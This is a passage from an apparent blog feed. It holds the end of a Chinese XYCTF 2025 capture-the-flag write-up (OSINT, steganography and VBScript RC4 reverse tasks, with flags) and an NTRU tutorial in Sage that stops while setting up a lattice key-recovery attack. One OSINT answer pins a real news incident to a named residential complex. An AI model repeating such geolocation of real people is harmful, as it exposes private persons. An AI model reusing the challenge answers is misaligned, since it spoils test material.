class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;<span class="string">.</span></span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br></pre></td></tr></table></figure></p><h3 id="XGCTF"><a href="#XGCTF" class="headerlink" title="XGCTF"></a>XGCTF</h3><blockquote><p>题目描述：<br>2024年CTFshow举办了一场名为“西瓜杯”的比赛（XGCTF）。其中LamentXU在出题的时候，从某场比赛拉了道原题下来改了改，结果传文件的时候传错了传成原题了。因为这件事LamentXU的损友dragonkeep在他之前的博客上的原题wp上加了一段flag来嘲笑LamentXU。请你找到XGCTF中唯一由LamentXU出的题，并找出这题对应的原题，接着找到dragonkeep师傅的博客，并从博客上讲解该题的博文中找到flag。（hint：dragonkeep师傅因为比较穷买不起域名，因此他博客的域名在dragonkeep的基础上多了个字母）</p></blockquote><p>从题目描述中可以整理出三条线索：</p><ol><li>flag在dragonkeep的博客里</li><li>这道题的flag所在的位置与XGCTF的一道原题有关</li><li>相关题目在XGCTF中标注的出题人为LamentXU</li></ol><p>首先可以找到dragonkeep的博客为：<a href="https://dragonkeeep.top，可以看到这个师傅主攻的方向应该是web，所以可以大致将范围缩小到XGCTF的web题，直接到[XGCTF的复现平台](https://ctf.show/challenges)中可以找到唯一一道由LamentXU提供的题目：">https://dragonkeeep.top，可以看到这个师傅主攻的方向应该是web，所以可以大致将范围缩小到XGCTF的web题，直接到[XGCTF的复现平台](https://ctf.show/challenges)中可以找到唯一一道由LamentXU提供的题目：</a><br><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog202504102114116.png" alt="Pasted image 20250404173308"><br>关键词应该是polluted，回到dragonkeep的博客中可以发现一篇文章跟polluted有关：<a href="https://dragonkeeep.top/category/CISCN%E5%8D%8E%E4%B8%9C%E5%8D%97WEB-Polluted/">CISCN华东南WEB-Polluted | Dragonkeep</a>，在里面找一圈没找到flag，看看是不是在网页HTML源代码的注释里面，查看网页源代码可以找到：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--Congratulations! You&#x27;ve got the flag:ZmxhZ3sxdF9JM190M0Vfc0BNZV9DaEFsMWVOZ2VfYVRfYTFMX1AxZUBzZV9mT3JnMXZlX01lfQ== --&gt;</span></span><br></pre></td></tr></table></figure><p>base64解码就是flag了.</p><h3 id="会飞的雷克萨斯"><a href="#会飞的雷克萨斯" class="headerlink" title="会飞的雷克萨斯"></a>会飞的雷克萨斯</h3><blockquote><p>在比赛群里给出flag的格式为flag{xx省xx市xx县xxx路xxxxxx内}，一个x对应一个字</p></blockquote><p>OSINT，给出一张图片：<br><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog202504102112308.jpeg" alt="ab3f53c6b3d2cfd23674a0c6e277d895"></p><p>直接搜索题目名字可以发现这是今年新年小孩玩炮仗炸化粪池把车炸飞的其中一个当事人在事发后改的网名，大多数新闻都显示发生的位置是四川省内江市资中县春岚北路，但是没有给出具体小区名，这个时候需要结合图片，注意到有一间叫唯曼医疗美容的店，百度地图搜索可以看到唯一结果：<br><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog202504102113751.png" alt="Pasted image 20250406232555"><br>可以知道事发地是在中铁城市中心内，所以flag就是flag{四川省内江市资中县春岚北路中铁城市中心内}</p><h3 id="曼波曼波曼波"><a href="#曼波曼波曼波" class="headerlink" title="曼波曼波曼波"></a>曼波曼波曼波</h3><p>给了个smn.txt，打开发现是倒过来的Base64，解码之后是张图片：<br><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog202504102113269.jpg" alt="smn"><br>附件里面还有个二维码，但是是假的flag，不用管，010可以看到上面图片的末尾有段zip，拉出来之后解压发现有一张图片，一个压缩包还有一个txt，txt里面是对压缩包密码的提示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">密码是什么来着，有点记不清了，呜呜呜呜</span><br><span class="line">好像是什么比赛名字加年份</span><br></pre></td></tr></table></figure><p>不用想都知道是XYCTF2025，解压发现一张跟外面的图片看上去一模一样的图片，且尺寸也是一致的，考虑盲水印，解盲水印可以看到：<br><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog202504102113280.png" alt="out"><br>肉眼识别可以得到flag为XYCTF{easy_yin_xie_dfbfuj877}</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="WARMUP"><a href="#WARMUP" class="headerlink" title="WARMUP"></a>WARMUP</h3><p>vbs逆向，用记事本打开并将开头的<code>Execute</code>改成<code>wscript.echo</code>，然后在命令行用<code>cscript</code>运行可以得到源码：<br><figure class="highlight vb"><table><tr><td class="code"><pre><span class="line">MsgBox <span class="string">&quot;Dear CTFER. Have fun in XYCTF 2025!&quot;</span></span><br><span class="line">flag = InputBox(<span class="string">&quot;Enter the FLAG:&quot;</span>, <span class="string">&quot;XYCTF&quot;</span>)</span><br><span class="line">wefbuwiue = <span class="string">&quot;90df4407ee093d309098d85a42be57a2979f1e51463a31e8d15e2fac4e84ea0df622a55c4ddfb535ef3e51e8b2528b826d5347e165912e99118333151273cc3fa8b2b3b413cf2bdb1e8c9c52865efc095a8dd89b3b3cfbb200bbadbf4a6cd4&quot;</span></span><br><span class="line">qwfe = <span class="string">&quot;rc4key&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> RunRC(sMessage, strKey)</span><br><span class="line">    <span class="keyword">Dim</span> kLen, i, j, temp, pos, outHex</span><br><span class="line">    <span class="keyword">Dim</span> s(<span class="number">255</span>), k(<span class="number">255</span>)</span><br><span class="line"></span><br><span class="line">    kLen = Len(strKey)</span><br><span class="line">    <span class="keyword">For</span> i = <span class="number">0</span> <span class="keyword">To</span> <span class="number">255</span></span><br><span class="line">        s(i) = i</span><br><span class="line">        k(i) = Asc(<span class="keyword">Mid</span>(strKey, (i <span class="built_in">Mod</span> kLen) + <span class="number">1</span>, <span class="number">1</span>)) </span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line"></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">For</span> i = <span class="number">0</span> <span class="keyword">To</span> <span class="number">255</span></span><br><span class="line">        j = (j + s(i) + k(i)) <span class="built_in">Mod</span> <span class="number">256</span></span><br><span class="line">        temp = s(i)</span><br><span class="line">        s(i) = s(j)</span><br><span class="line">        s(j) = temp</span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span> : j = <span class="number">0</span> : outHex = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">For</span> pos = <span class="number">1</span> <span class="keyword">To</span> Len(sMessage)</span><br><span class="line">        i = (i + <span class="number">1</span>) <span class="built_in">Mod</span> <span class="number">256</span></span><br><span class="line">        j = (j + s(i)) <span class="built_in">Mod</span> <span class="number">256</span></span><br><span class="line">        temp = s(i)</span><br><span class="line">        s(i) = s(j)</span><br><span class="line">        s(j) = temp</span><br><span class="line"></span><br><span class="line">        <span class="keyword">Dim</span> plainChar, cipherByte</span><br><span class="line">        plainChar = Asc(<span class="keyword">Mid</span>(sMessage, pos, <span class="number">1</span>)) </span><br><span class="line">        cipherByte = s((s(i) + s(j)) <span class="built_in">Mod</span> <span class="number">256</span>) <span class="built_in">Xor</span> plainChar</span><br><span class="line">        outHex = outHex &amp; Right(<span class="string">&quot;0&quot;</span> &amp; Hex(cipherByte), <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line"></span><br><span class="line">    RunRC = outHex</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> LCase(RunRC(flag, qwfe)) = LCase(wefbuwiue) <span class="keyword">Then</span></span><br><span class="line">    MsgBox <span class="string">&quot;Congratulations! Correct FLAG!&quot;</span></span><br><span class="line"><span class="keyword">Else</span></span><br><span class="line">    MsgBox <span class="string">&quot;Wrong flag.&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br></pre></td></tr></table></figure><br>就是RC4加密，密钥为<code>rc4key</code>，用CyberChef解密就可以得到flag了.</p>]]></content>
      
      
      <categories>
          
          <category> Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
            <tag> Misc </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NTRU</title>
      <link href="/2025/04/09/NTRU/"/>
      <url>/2025/04/09/NTRU/</url>
      
        <content type="html"><![CDATA[<blockquote><p>参考资料：<a href="https://link.springer.com/book/10.1007/978-1-4939-1711-2">An Introduction to Mathematical Cryptography | SpringerLink</a></p></blockquote><h2 id="前置知识">前置知识</h2><h3 id="格">格</h3><p>与格相关的前置知识在<a href="https://triodelzx.github.io/2025/03/31/%E6%A0%BC%E5%AF%86%E7%A0%81/">这篇博客</a>里面都有提及</p><h3 id="卷积多项式环">卷积多项式环</h3><p>对于一个整数<span class="math inline">\(N\)</span>，秩为<span class="math inline">\(N\)</span>的卷积多项式环即为如下商环： <span class="math display">\[R=\frac{\mathbb{Z}[x]}{(x^{N}-1)}\]</span> 类似的我们也可以定义出模<span class="math inline">\(q\)</span>的卷积多项式环为如下商环： <span class="math display">\[R_q=\frac{(\mathbb{Z}/q\mathbb{Z})[x]}{(x^{N}-1)}\]</span> 可以知道卷积多项式环中每一个多项式<span class="math inline">\(a(x)\)</span>都有唯一的表示（在这之后，我们默认卷积多项式环内的多项式都是如下表示）： <span class="math display">\[a(x)=a_0+a_1x+a_2x^2+\cdots+a_{N-1}x^{N-1}\]</span> 其中<span class="math inline">\(a_0,a_1,\cdots,a_{N-1}\in \mathbb{Z}\)</span>（或者<span class="math inline">\(\mathbb{Z}/q\mathbb{Z}\)</span>，这取决于这个卷积多项式环是一般的卷积多项式环还是模<span class="math inline">\(q\)</span>的卷积多项式环） 卷积多项式环是NTRU密码体系的基础。</p><h3 id="center-lift">center-lift</h3><p>对于<span class="math inline">\(R_q\)</span>上一个多项式<span class="math inline">\(a(x)\)</span>，<span class="math inline">\(a(x)\)</span>到<span class="math inline">\(R\)</span>上的center-lift即为一个多项式<span class="math inline">\(a&#39;(x)\)</span>满足： <span class="math display">\[a&#39;(x)\equiv a(x)\pmod{q}\]</span> 其中<span class="math inline">\(a&#39;(x)\)</span>的系数<span class="math inline">\(a_i&#39;\in(-\frac{q}{2},-\frac{q}{2}]\)</span>. 对于一个多项式，要获得其center-lift有如下算法： <span class="math display">\[a_i&#39;=\begin{cases}a_i&amp;,0\le a_i\le\frac{q}{2}\\a_i-q&amp;,\frac{q}{2}&lt; a_i&lt; q\end{cases}\]</span> center-lift可以通过如下代码实现： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">center_lift</span>(<span class="params">Rm, R, f</span>):</span><br><span class="line">    modulo = ZZ(Rm(<span class="built_in">list</span>(f)).base_ring()(-<span class="number">1</span>)) + <span class="number">1</span></span><br><span class="line">    l = [ZZ(x) <span class="keyword">if</span> x &lt;= modulo // <span class="number">2</span> <span class="keyword">else</span> ZZ(x) - modulo <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">list</span>(f)]</span><br><span class="line">    <span class="keyword">return</span> R(l)</span><br></pre></td></tr></table></figure></p><h3 id="三元多项式ternary-polynomial">三元多项式（ternary polynomial）</h3><p>对于卷积多项式环<span class="math inline">\(R=\frac{\mathbb{Z}[x]}{(x^{N}-1)}\)</span>，对于任意正数<span class="math inline">\(d_1,d_2\)</span>，若多项式<span class="math inline">\(a(x)\in R\)</span>满足以下条件：</p><ol type="1"><li><span class="math inline">\(a(x)\)</span>中有<span class="math inline">\(d_1\)</span>个系数为<span class="math inline">\(1\)</span>；</li><li><span class="math inline">\(a(x)\)</span>中有<span class="math inline">\(d_2\)</span>个系数为<span class="math inline">\(-1\)</span>；</li><li><span class="math inline">\(a(x)\)</span>中其余系数均为<span class="math inline">\(0\)</span>.</li></ol><p>则称这个多项式为一个三元多项式（ternary polynomial，或称trinary polynomial），对于一个卷积多项式环<span class="math inline">\(R\)</span>，其上的所有三元多项式的集合记为： <span class="math display">\[\mathcal{T}(d_1,d_2)=\left\{a(x)\in R| a(x)\text{ is a ternary polynomial}\right\}\]</span></p><h2 id="ntru算法细节">NTRU算法细节</h2><p>取整数<span class="math inline">\(N\ge1\)</span>以及两个模数<span class="math inline">\(p,q\)</span>（其中<span class="math inline">\(N\)</span>为质数，且<span class="math inline">\(N\)</span>与<span class="math inline">\(q\)</span>互质，<span class="math inline">\(p\)</span>与<span class="math inline">\(q\)</span>互质），得到如下三个卷积多项式环： <span class="math display">\[R=\frac{\mathbb{Z}[x]}{(x^{N}-1)},\quad R_p=\frac{(\mathbb{Z}/p\mathbb{Z})[x]}{(x^{N}-1)},\quad R_q=\frac{(\mathbb{Z}/q\mathbb{Z})[x]}{(x^{N}-1)}\]</span> 在此我们将消息传递的双方分别称为Alice和Bob，Alice选取公共参数<span class="math inline">\((N,p,q,d)\)</span>（<span class="math inline">\(d\)</span>也是个整数，公共参数的选择应满足<span class="math inline">\(q&gt;(6d+1)p\)</span>），并在<span class="math inline">\(R\)</span>上随机选取三元多项式<span class="math inline">\(f(x)\in\mathcal{T}(d+1,d)\)</span>以及<span class="math inline">\(g(x)\in\mathcal{T}(d,d)\)</span>，计算： <span class="math display">\[\begin{aligned}F_p\equiv f^{-1}\pmod{p}\\F_q\equiv f^{-1}\pmod{q}\end{aligned}\]</span> 这样就可以得到一个<span class="math inline">\(R_p\)</span>上的多项式<span class="math inline">\(F_p\)</span>以及一个<span class="math inline">\(R_q\)</span>上的多项式<span class="math inline">\(F_q\)</span>，在此之后Alice在<span class="math inline">\(R_q\)</span>上计算： <span class="math display">\[h(x)=F_q(x)\star g(x)\]</span> 在这里“<span class="math inline">\(\star\)</span>”表示卷积多项式环上多项式的乘法，对于两个卷积多项式环<span class="math inline">\(R\)</span>上的多项式<span class="math inline">\(a(x),b(x)\)</span>，其乘积定义如下： <span class="math display">\[a(x)\star b(x)=c(x),\quad c_k=\sum_{i+j\equiv k\pmod{N}}{a_{i}b_{j}}\]</span> 由此计算出的多项式<span class="math inline">\(h(x)\)</span>即为<strong>公钥</strong>，前面生成的<span class="math inline">\((f,F_p)\)</span>就是<strong>私钥</strong>（实际上私钥只需要<span class="math inline">\(f\)</span>，Alice可以通过<span class="math inline">\(f\)</span>来计算出<span class="math inline">\(F_p\)</span>）。 在此之后Bob需要通过公钥<span class="math inline">\(h(x)\)</span>来加密明文<span class="math inline">\(m(x)\)</span>（其中明文<span class="math inline">\(m(x)\in R\)</span>，而且其中系数<span class="math inline">\(m_i\)</span>满足<span class="math inline">\(-\frac{p}{2}&lt;m_i\le \frac{p}{2}\)</span>，实际上<span class="math inline">\(m(x)\)</span>就是<span class="math inline">\(R_p\)</span>上某个多项式的center-lift），Bob先选取一个随机三元多项式<span class="math inline">\(r(x)\in\mathcal{T}(d,d)\)</span>，计算： <span class="math display">\[e(x)\equiv ph(x)\star r(x)+m(x)\pmod{q}\]</span> 得到的多项式<span class="math inline">\(e(x)\)</span>就是Bob的密文，Alice得到Bob发送的密文之后要进行解密，则需先在<span class="math inline">\(R_q\)</span>上计算： <span class="math display">\[a(x)\equiv f(x)\star e(x)\pmod{q}\]</span> 然后得到<span class="math inline">\(a(x)\)</span>的center-lift，然后再在<span class="math inline">\(R_p\)</span>中计算： <span class="math display">\[b(x)\equiv F_p(x)\star a(x)\pmod{p}\]</span> 这样得到的<span class="math inline">\(R_p\)</span>上的多项式<span class="math inline">\(b(x)\)</span>就是明文<span class="math inline">\(m(x)\)</span>. NTRU大致流程如下图所示（在参考资料里截的）： <img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog202504092251259.png" alt="Pasted image 20250408212029" /></p><h3 id="ntru的实现">NTRU的实现</h3><p>在这里通过sage实现参考资料中的一个例子（Example 7.53）： 取<span class="math inline">\((N, p, q, d) = (7, 3, 41, 2)\)</span>，显然有<span class="math inline">\((6d+1)p=39&lt;q\)</span>，而且<span class="math inline">\((p,q)=1,(N,q)=1\)</span>，符合参数选择的条件，那么可以通过如下代码构造出三个卷积多项式环： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">_R = PolynomialRing(ZZ, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">R = _R.quotient(x^N - <span class="number">1</span>, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">_Rp = PolynomialRing(Zmod(p), <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">Rp = _Rp.quotient(x^N - <span class="number">1</span>, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">_Rq = PolynomialRing(Zmod(q), <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">Rq = _Rq.quotient(x^N - <span class="number">1</span>, <span class="string">&#x27;x&#x27;</span>)</span><br></pre></td></tr></table></figure> 对固定的卷积多项式环<span class="math inline">\(R\)</span>，可以通过如下代码来获得随机三元多项式： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">T</span>(<span class="params">R, N, d1, d2</span>):</span><br><span class="line">    <span class="keyword">from</span> random <span class="keyword">import</span> shuffle</span><br><span class="line">    coef = [<span class="number">1</span>] * d1 + [-<span class="number">1</span>] * d2 + [<span class="number">0</span>] * (N - d1 - d2)</span><br><span class="line">    shuffle(coef)</span><br><span class="line">    <span class="keyword">return</span> R(coef)</span><br></pre></td></tr></table></figure> 随机选取两个<span class="math inline">\(R\)</span>上的三元多项式<span class="math inline">\(f(x)\in\mathcal{T}(3,2)\)</span>以及<span class="math inline">\(g(x)\in\mathcal{T}(2,2)\)</span>（并保证<span class="math inline">\(f(x)\)</span>在<span class="math inline">\(R_p\)</span>以及<span class="math inline">\(R_q\)</span>上均可逆），根据给出的例子，选取的两个多项式如下： <span class="math display">\[\begin{aligned}&amp;f(x)=x^6−x^4+x^3+x^2−1\\&amp;g(x)=x^6+x^4−x^2−x\end{aligned}\]</span> 然后分别在<span class="math inline">\(R_p,R_q\)</span>上计算<span class="math inline">\(f(x)\)</span>的逆，按道理，我们可以通过如下代码来求多项式<span class="math inline">\(f(x)\)</span>在任意模卷积多项式环<span class="math inline">\(R_m\)</span>的逆： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">inv</span>(<span class="params">Rm, f</span>):</span><br><span class="line">    <span class="keyword">return</span> Rm(<span class="built_in">list</span>(f)).inverse()</span><br></pre></td></tr></table></figure> 但是如果环<span class="math inline">\(R_m\)</span>的模数为合数的时候就跑不动了，找了一圈在<a href="https://latticehacks.cr.yp.to/ntru.html">这里</a>找到了一种名为<code>invertmodpowerof2</code>的算法，经过修改得到了下面的版本： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">invertmodpowerof2</span>(<span class="params">Rm, R, f</span>):</span><br><span class="line">    modulo = ZZ(Rm(<span class="built_in">list</span>(f)).base_ring()(-<span class="number">1</span>)) + <span class="number">1</span></span><br><span class="line">    <span class="keyword">assert</span> modulo.is_power_of(<span class="number">2</span>)</span><br><span class="line">    _R2 = PolynomialRing(Zmod(<span class="number">2</span>), <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">    R2 = _R2.quotient(x^N - <span class="number">1</span>, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    g = R2(<span class="built_in">list</span>(f)).inverse()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = center_lift(Rm, R, Rm(<span class="built_in">list</span>(f * g)))</span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> g</span><br><span class="line">        g = center_lift(Rm, R, Rm(<span class="built_in">list</span>(g * (<span class="number">2</span> - r))))</span><br></pre></td></tr></table></figure> 不过这个算法只能用于模数为<span class="math inline">\(2^k\)</span>的情况，对一般合数暂时还没找到合适的方案. 回到例子，通过如下代码可以计算出<span class="math inline">\(F_p\)</span>以及<span class="math inline">\(F_q\)</span>： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Fp = inv(Rp, f)</span><br><span class="line">Fq = inv(Rq, f)</span><br></pre></td></tr></table></figure> 可以得到： <span class="math display">\[\begin{aligned}&amp;F_p=x^{6} + 2 x^{5} + x^{3} + x^{2} + x + 1\in R_p\\&amp;F_q=8 x^{6} + 26 x^{5} + 31 x^{4} + 21 x^{3} + 40 x^{2} + 2 x + 37\in R_q\end{aligned}\]</span> 可以得到<span class="math inline">\((f,F_p)\)</span>作为私钥，并通过如下代码计算公钥<span class="math inline">\(h(x)=F_q(x)\star g(x)\)</span>： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">h = Fq * Rq(<span class="built_in">list</span>(g))</span><br></pre></td></tr></table></figure> 得到： <span class="math display">\[h(x)=F_q(x)\star g(x)=20 x^{6} + 40 x^{5} + 2 x^{4} + 38 x^{3} + 8 x^{2} + 26 x + 30\in R_q\]</span> 欲加密消息<span class="math inline">\(m(x)=−x^5+x^3+x^2−x+1\)</span>，取<span class="math inline">\(R\)</span>上随机三元多项式<span class="math inline">\(r(x)=x^6 −x^5 +x−1\in\mathcal{T}(2,2)\)</span>，通过<code>e = Rq(list(p*r*h + m))</code>在<span class="math inline">\(R_q\)</span>上计算<span class="math inline">\(e(x)\equiv pr(x)\star h(x)+m(x)\pmod{q}\)</span>，得到密文： <span class="math display">\[e(x)=31 x^{6} + 19 x^{5} + 4 x^{4} + 2 x^{3} + 40 x^{2} + 3 x + 25\]</span> 参数选取以及加密全流程代码如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(N, p, q, d) = (<span class="number">7</span>, <span class="number">3</span>, <span class="number">41</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">_R = PolynomialRing(ZZ, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">R = _R.quotient(x^N - <span class="number">1</span>, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">_Rp = PolynomialRing(Zmod(p), <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">Rp = _Rp.quotient(x^N - <span class="number">1</span>, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">_Rq = PolynomialRing(Zmod(q), <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">Rq = _Rq.quotient(x^N - <span class="number">1</span>, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">T</span>(<span class="params">R, N, d1, d2</span>):</span><br><span class="line">    <span class="keyword">from</span> random <span class="keyword">import</span> shuffle</span><br><span class="line">    coef = [<span class="number">1</span>] * d1 + [-<span class="number">1</span>] * d2 + [<span class="number">0</span>] * (N - d1 - d2)</span><br><span class="line">    shuffle(coef)</span><br><span class="line">    <span class="keyword">return</span> R(coef)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">center_lift</span>(<span class="params">Rm, R, f</span>):</span><br><span class="line">    modulo = ZZ(Rm(<span class="built_in">list</span>(f)).base_ring()(-<span class="number">1</span>)) + <span class="number">1</span></span><br><span class="line">    l = [ZZ(x) <span class="keyword">if</span> x &lt;= modulo // <span class="number">2</span> <span class="keyword">else</span> ZZ(x) - modulo <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">list</span>(f)]</span><br><span class="line">    <span class="keyword">return</span> R(l)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv</span>(<span class="params">Rm, f</span>):</span><br><span class="line">    <span class="keyword">return</span> Rm(f).inverse()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invertmodpowerof2</span>(<span class="params">Rm, R, f</span>):</span><br><span class="line">    modulo = ZZ(Rm(<span class="built_in">list</span>(f)).base_ring()(-<span class="number">1</span>)) + <span class="number">1</span></span><br><span class="line">    <span class="keyword">assert</span> modulo.is_power_of(<span class="number">2</span>)</span><br><span class="line">    _R2 = PolynomialRing(Zmod(<span class="number">2</span>), <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">    R2 = _R2.quotient(x^N - <span class="number">1</span>, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    g = R2(<span class="built_in">list</span>(f)).inverse()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = center_lift(Rm, R, Rm(<span class="built_in">list</span>(f * g)))</span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> g</span><br><span class="line">        g = center_lift(Rm, R, Rm(<span class="built_in">list</span>(g * (<span class="number">2</span> - r))))</span><br><span class="line"></span><br><span class="line"><span class="comment"># f = T(R, N, d + 1, d)</span></span><br><span class="line">f = R(<span class="string">&quot;x^6 - x^4 + x^3 + x^2 - 1&quot;</span>) <span class="comment"># private key</span></span><br><span class="line"><span class="comment"># g = T(R, N, d, d)</span></span><br><span class="line">g = R(<span class="string">&quot;x^6 + x^4 - x^2 - x&quot;</span>)</span><br><span class="line"></span><br><span class="line">Fp = inv(Rp, f)</span><br><span class="line">Fq = inv(Rq, f)</span><br><span class="line"></span><br><span class="line">h = Fq * Rq(<span class="built_in">list</span>(g)) <span class="comment"># public key</span></span><br><span class="line"></span><br><span class="line">m = R(<span class="string">&quot;-x^5+x^3+x^2-x+1&quot;</span>)</span><br><span class="line"><span class="comment"># r = T(R, N, d, d)</span></span><br><span class="line">r = R(<span class="string">&quot;x^6-x^5+x-1&quot;</span>)</span><br><span class="line"></span><br><span class="line">e = Rq(<span class="built_in">list</span>(p*r*h + m))</span><br></pre></td></tr></table></figure> 在获取密文之后，需要首先在<span class="math inline">\(R_q\)</span>上计算<span class="math inline">\(f(x)\star e(x)\)</span>并获取其center-lift得到<span class="math inline">\(a(x)\)</span>： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = center_lift(Rq, R, Rq(<span class="built_in">list</span>(f * e)))</span><br></pre></td></tr></table></figure> 得到： <span class="math display">\[a(x)=x^{6} + 10x^{5} - 8x^{4} - x^{3} - x^{2} + x - 1\]</span></p><p>然后在<span class="math inline">\(R_p\)</span>上计算<span class="math inline">\(F_p\star a(x)\)</span>并获取其center-lift得到<span class="math inline">\(b(x)\)</span>： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">b = center_lift(Rp, R, Rp(<span class="built_in">list</span>(Fp * a)))</span><br></pre></td></tr></table></figure> 此时可以得到： <span class="math display">\[b(x)=-x^{5} + x^{3} + x^{2} - x + 1\]</span> 可以看到<span class="math inline">\(b(x)=m(x)\)</span>，说明此时计算出来的就是明文，如此可以得到解密流程如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = center_lift(Rq, R, Rq(<span class="built_in">list</span>(f * e)))</span><br><span class="line">b = center_lift(Rp, R, Rp(<span class="built_in">list</span>(Fp * a)))</span><br></pre></td></tr></table></figure></p><h2 id="ntru的格攻击">NTRU的格攻击</h2><p>回到公钥计算这一步，我们需要在<span class="math inline">\(R_q\)</span>上计算<span class="math inline">\(h(x)=F_q(x)\star g(x)\)</span>，两边乘上<span class="math inline">\(f(x)\)</span>可以得到： <span class="math display">\[f(x)\star h(x)\equiv g(x)\pmod{q}\]</span> 与对数的处理方法类似的，可以将上式变为： <span class="math display">\[f(x)\star h(x)=g(x)+q\cdot u(x)\]</span> 其中<span class="math inline">\(u(x)\in R\)</span>，我们想要的是私钥<span class="math inline">\(f(x)\)</span>，那么可以构造出如下方程： <span class="math display">\[(f(x),-u(x))\left(\begin{matrix}1&amp;h(x)\\0&amp;q\end{matrix}\right)=(f(x),g(x))\tag{1}\]</span> 